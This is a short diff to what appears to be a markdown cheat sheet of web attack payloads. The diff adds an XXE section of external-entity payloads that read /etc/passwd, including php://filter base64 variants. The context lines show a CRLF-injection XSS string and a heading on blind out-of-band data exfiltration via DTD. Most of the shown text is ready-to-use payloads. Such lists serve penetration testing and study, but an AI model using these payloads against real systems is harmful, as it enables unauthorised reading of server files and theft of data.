@@ -725,8 +725,16 @@ https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploi
 
 /%0d%0a%0d%0a\<svg onload=(0)>
 
-## XXE Blind Out-Of-Band
-  
+## XXE
+
+### Methods:
+
+\<!ENTITY % file SYSTEM "file:///etc/passwd">
+\<!ENTITY % file SYSTEM "php://filter/zlib.deflate/read=convert.base64-encode/resource=/etc/passwd">
+\<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
+
+## XXE - Blind Out-Of-Band
+
 ### Exfiltrate data exfiltrating data via dtd
 
 -> Part 1
